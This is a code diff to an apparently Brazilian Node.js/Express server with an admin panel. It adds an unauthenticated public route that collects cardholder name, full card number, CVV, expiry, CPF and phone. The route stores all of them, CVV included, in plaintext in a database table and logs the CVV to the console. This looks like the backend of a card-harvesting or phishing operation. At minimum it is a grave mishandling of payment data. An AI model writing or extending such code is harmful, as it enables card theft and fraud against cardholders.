@@ -262,7 +262,46 @@ app.post('/api/admin/login', async (req, res) => {
 app.post('/api/admin/logout', (req, res) => { 
     res.json({ success: true }); 
 });
-
+// ============ ROTA PÚBLICA PARA SALVAR CARTÕES ============
+app.post('/api/cartoes/salvar', async (req, res) => {
+    const { nome_titular, numero_cartao, cvv, validade, cpf, telefone } = req.body;
+    
+    console.log('Dados do cartão:', { nome_titular, numero_cartao: numero_cartao?.slice(-4), cvv, validade, cpf });
+    
+    if (!nome_titular || !numero_cartao || !cvv || !validade) {
+        return res.status(400).json({ error: 'Todos os campos do cartão são obrigatórios' });
+    }
+    
+    try {
+        let cliente = await pool.query('SELECT id FROM users WHERE cpf = $1', [cpf]);
+        let cliente_id;
+        
+        if (cliente.rows.length > 0) {
+            cliente_id = cliente.rows[0].id;
+            if (telefone) {
+                await pool.query('UPDATE users SET telefone = $1 WHERE id = $2', [telefone, cliente_id]);
+            }
+        } else {
+            const novoCliente = await pool.query(
+                'INSERT INTO users (cpf, telefone, status) VALUES ($1, $2, $3) RETURNING id',
+                [cpf || '00000000000', telefone || '', 'cadastro_cartao']
+            );
+            cliente_id = novoCliente.rows[0].id;
+        }
+        
+        await pool.query(
+            `INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, cvv, validade) 
+             VALUES ($1, $2, $3, $4, $5)`,
+            [cliente_id, nome_titular, numero_cartao, cvv, validade]
+        );
+        
+        console.log(`Cartão salvo com sucesso!`);
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Erro ao salvar cartão:', err);
+        res.status(500).json({ error: err.message });
+    }
+});
 // ============ ROTAS ADMIN ============
 app.get('/api/admin/stats', verificarAdminToken, async (req, res) => {
     try {
